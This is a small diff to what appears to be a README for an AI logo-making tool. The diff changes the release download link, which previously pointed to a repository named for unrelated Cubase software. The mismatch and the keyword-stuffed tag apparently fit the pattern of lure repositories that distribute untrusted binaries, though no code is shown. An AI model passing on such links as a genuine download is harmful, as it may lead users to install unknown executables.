@@ -89,7 +89,7 @@ Improve the AI models collaboratively—train on your own brand guidelines and o
 ---
 
  <div align="center">
-  <a href="https://github.com/TechnomancerEngage/cubase15/releases/tag/Cubase">
+  <a href="https://github.com/centralpigeonnippers/ai-logo-maker/releases/tag/ai-logoforge-maker-logo-ai">
     <b>⬇️ DOWNLOAD (Latest Release)</b>
   </a>
 </div>
